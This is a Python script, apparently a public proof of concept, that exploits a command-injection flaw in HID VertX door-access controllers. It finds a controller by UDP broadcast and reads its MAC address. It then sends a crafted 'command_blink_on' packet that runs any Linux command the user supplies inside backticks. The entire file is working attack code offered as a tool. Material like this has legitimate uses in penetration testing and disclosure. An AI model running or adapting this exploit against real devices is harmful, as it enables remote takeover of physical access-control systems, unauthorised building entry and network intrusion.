#!/usr/bin/env python
# Copyright (c) 2016, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import argparse
from socket import *

def main():
	parser = argparse.ArgumentParser(description='HID VertX controller command injection')
	parser.add_argument('-i', '--ip', help='IP address of VertX controller, (default 255.255.255.255)', default='255.255.255.255', required=False)
	parser.add_argument('-p', '--port', help='Port of VertX controller, (default 4070)', default=4070, type=int, required=False)
	parser.add_argument('payload', help='Linux command payload (hint: ping -c 5 IP_ADDRESS)', action='store_true')
	parsed, args = parser.parse_known_args()

	payload = ' '.join(args)

	s = socket(AF_INET, SOCK_DGRAM)
	s.settimeout(5)
	if parsed.ip == '255.255.255.255':
		s.bind(('', 0))
		s.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)

	try:
		# Get information about VertX controller
		print_status("Getting MAC address of {0}...\n".format(parsed.ip))
		s.sendto('discover;013;', (parsed.ip, parsed.port))
		discovery_response = s.recvfrom(1024)
		if discovery_response:
			data = discovery_response[0].split(';')
			print_good("VertX Controller Information")
			print "RAW (ASCII): {0}".format(discovery_response)
			print "Name: {0}".format(data[3])
			print "Model: {0}".format(data[6])
			print "Version: {0} - ({1})".format(data[7], data[8])
			print "IP Address: {0}".format(data[4])
			print "MAC Address: {0}\n".format(data[2])

			# Trigger command injection
			mac_address = data[2]
			if mac_address:
				full_payload = "command_blink_on;042;{0};`{1}`;".format(mac_address, payload)
				print_status("Sending payload: ({0}) to {1}...".format(payload, parsed.ip))
				s.sendto(full_payload, (parsed.ip, parsed.port))

				# Parse response
				payload_response = s.recvfrom(1024)
				if payload_response:
					if payload_response[0].split(';')[0] == 'ack':
						print_good('Command sent successfully')
				else:
					print_warn('VertX controller did not send a response!')
		else:
			print_warn('Device might not be a VertX controller!')

	except Exception as error:
		print_error("Error: {0}".format(error))

def print_error(msg):
	print "\033[1m\033[31m[-]\033[0m {0}".format(msg)
	
def print_status(msg):
	print "\033[1m\033[34m[*]\033[0m {0}".format(msg)
		
def print_good(msg):
	print "\033[1m\033[32m[+]\033[0m {0}".format(msg)
	
def print_warn(msg):
	print "\033[1m\033[33m[!]\033[0m {0}".format(msg)

if __name__ == '__main__':
	main()
